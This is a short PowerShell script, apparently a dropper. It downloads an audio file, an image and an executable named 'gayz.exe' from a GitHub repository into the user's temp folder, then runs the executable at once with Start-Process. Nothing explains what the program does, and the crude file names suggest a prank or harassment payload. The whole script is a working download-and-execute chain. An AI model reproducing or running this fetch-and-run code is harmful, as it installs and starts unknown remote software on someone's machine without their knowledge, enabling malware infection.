$client = New-Object System.Net.WebClient
$pathassets = $env:temp + "\assets"

New-Item -ItemType Directory -Force -Path $pathassets 

$file = $env:temp + "\assets\gays.mp3"
if (Test-Path $file) {
  Remove-Item $file
  write-host "$file has been deleted"
}
else { Write-host "$file doesn't exist" }
$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/gayz.mp3", $file)

$file = $env:temp + "\assets\ura.png"
if (Test-Path $file) {
  Remove-Item $file
  write-host "$file has been deleted"
}
else { Write-host "$file doesn't exist" }
$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $file)

$file = $env:temp + "\myexe.exe" 
if (Test-Path $file) {
  Remove-Item $file
  write-host "$file has been deleted"
}
else { Write-host "$file doesn't exist" }
$client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $file)

Start-Process -Filepath $file
